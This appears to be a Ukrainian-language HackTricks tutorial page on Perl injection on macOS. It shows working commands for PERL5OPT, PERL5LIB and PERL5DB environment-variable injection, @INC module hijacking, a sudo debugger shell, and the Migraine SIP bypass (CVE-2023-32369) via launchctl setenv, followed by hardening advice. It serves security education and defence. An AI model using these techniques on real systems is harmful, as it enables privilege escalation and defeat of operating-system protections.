# Ін’єкція в застосунки Perl

{{#include ../../../banners/hacktricks-training.md}}

## Через змінні середовища `PERL5OPT` і `PERL5LIB`

За допомогою змінної середовища **`PERL5OPT`** можна змусити **Perl** виконувати довільні команди під час запуску інтерпретатора (навіть **до** того, як буде проаналізовано перший рядок цільового скрипту).
Наприклад, створіть цей скрипт:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Тепер **експортуйте змінну середовища** та виконайте скрипт **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Інший варіант — створити модуль Perl (наприклад, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
А потім використайте змінні середовища, щоб модуль було автоматично знайдено та завантажено:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Інші цікаві environment variables

* **`PERL5DB`** – коли interpreter запускається з прапорцем **`-d`** (debugger), вміст `PERL5DB` виконується як Perl code *у* debugger context.
Якщо ви можете впливати і на environment, і на command-line flags privileged Perl process, можна зробити таке:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – у Windows ця variable визначає, який shell executable Perl використовуватиме, коли йому потрібно запустити shell. Згадується тут лише для повноти, оскільки не має значення для macOS.

Хоча `PERL5DB` потребує switch `-d`, часто трапляються maintenance або installer scripts, які виконуються як *root* із увімкненим цим прапорцем для verbose troubleshooting, що робить variable дійсним escalation vector.

## Через dependencies (@INC abuse)

Можна переглянути include path, який шукатиме Perl (**`@INC`**), запустивши:
```bash
perl -e 'print join("\n", @INC)'
```
Типовий вивід у macOS 13/14 має такий вигляд:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Деякі з повернутих папок навіть не існують, однак **`/Library/Perl/5.30`** існує, *не захищена* SIP і розташована *перед* папками, захищеними SIP. Тому, якщо ви можете записувати від імені *root*, ви можете розмістити шкідливий модуль (наприклад, `File/Basename.pm`), який буде *пріоритетно* завантажуватися будь-яким привілейованим скриптом, що імпортує цей модуль.

> [!WARNING]
> Вам усе ще потрібен **root**, щоб записувати всередині `/Library/Perl`, а macOS покаже запит **TCC** на надання *Full Disk Access* процесу, який виконує операцію запису.

Наприклад, якщо скрипт імпортує **`use File::Basename;`**, можна було б створити `/Library/Perl/5.30/File/Basename.pm`, що містить код під контролем атакувальника.

## Обхід SIP через Migration Assistant (CVE-2023-32369 “Migraine”)

У травні 2023 року Microsoft розкрила **CVE-2023-32369**, яку назвали **Migraine**, — post-exploitation technique, що дозволяє атакувальнику з *root* повністю **обійти System Integrity Protection (SIP)**.
Вразливим компонентом є **`systemmigrationd`** — daemon із entitlement **`com.apple.rootless.install.heritable`**. Будь-який дочірній процес, запущений цим daemon, успадковує entitlement і тому працює **поза** обмеженнями SIP.<sup>[[1]](#references)</sup>

Серед дочірніх процесів, визначених дослідниками, є підписаний Apple interpreter:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Оскільки Perl враховує `PERL5OPT` (а Bash — `BASH_ENV`), отруєння *середовища* daemon достатнє для отримання довільного виконання в контексті без SIP:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Коли запускається `migrateLocalKDC`, `/usr/bin/perl` стартує зі шкідливим `PERL5OPT` і виконує `/private/tmp/migraine.sh` *до повторного ввімкнення SIP*. З цього скрипта можна, наприклад, скопіювати payload до **`/System/Library/LaunchDaemons`** або призначити файлу розширений атрибут `com.apple.rootless`, щоб зробити файл **невидаляємим**.

Apple виправила проблему в macOS **Ventura 13.4**, **Monterey 12.6.6** і **Big Sur 11.7.7**, але старі або не пропатчені системи залишаються вразливими.<sup>[[1]](#references)</sup>

## Рекомендації з Hardening

1. **Очищайте небезпечні змінні** – привілейовані launchdaemons або cron jobs повинні запускатися з чистим середовищем (`launchctl unsetenv PERL5OPT`, `env -i` тощо).
2. **Уникайте запуску інтерпретаторів від імені root**, якщо це не є суворо необхідним. Використовуйте скомпільовані бінарні файли або рано знижуйте привілеї.
3. **Постачайте скрипти з `-T` (taint mode)**, щоб Perl ігнорував `PERL5OPT` та інші небезпечні перемикачі, коли ввімкнено перевірку taint.
4. **Підтримуйте macOS в актуальному стані** – “Migraine” повністю виправлено в поточних релізах.

## References

- [1] [Microsoft Security Blog – Нова вразливість macOS Migraine може обійти System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
